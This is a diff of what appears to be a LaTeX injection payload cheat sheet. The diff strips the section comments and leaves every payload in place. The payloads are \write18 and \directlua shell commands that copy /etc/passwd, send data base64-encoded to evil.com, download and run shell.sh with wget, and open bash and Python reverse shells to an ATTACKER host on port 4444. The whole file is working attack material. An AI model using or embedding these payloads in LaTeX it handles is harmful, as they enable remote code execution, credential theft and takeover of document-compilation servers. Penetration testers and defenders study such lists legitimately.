@@ -1,8 +1,3 @@
-# ============================================================
-# LaTeX Injection — Remote Code Execution
-# ============================================================
-
-# ---- Shell Escape (requires -shell-escape flag) ----
 \immediate\write18{id}
 \immediate\write18{id > /tmp/pwned.txt}
 \immediate\write18{cat /etc/passwd > /tmp/out.txt}
@@ -11,35 +6,27 @@
 \write18{id}
 \write18{curl https://evil.com/$(id)}
 
-# ---- Openout / Shell Pipe ----
 \openin\file=|"id"
 \read\file to\x
 \x
 
-# ---- System() via write18 ----
 \newcommand{\exec}[1]{\immediate\write18{#1}}
 \exec{id}
 \exec{bash -i >& /dev/tcp/ATTACKER/4444 0>&1}
 \exec{wget https://evil.com/shell.sh -O /tmp/s && bash /tmp/s}
 
-# ---- Exfiltration via URL ----
 \immediate\write18{curl https://evil.com/?x=$(cat /etc/passwd | base64)}
 \immediate\write18{curl https://evil.com/?hostname=$(hostname)}
 
-# ---- Reverse Shell ----
 \immediate\write18{bash -i >& /dev/tcp/ATTACKER/4444 0>&1}
 \immediate\write18{python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'}
 
-# ---- Via minted Package ----
 \begin{minted}{bash}
 id
 \end{minted}
 
-# ---- tcl/tk (miktex/pdflatex) ----
 \directlua{os.execute("id")}
 \directlua{os.execute("curl https://evil.com/$(id)")}
 
-# ---- Detection Without RCE ----
-# Check if write18 is enabled:
 \immediate\write18{id > /tmp/test123}
 \input{/tmp/test123}
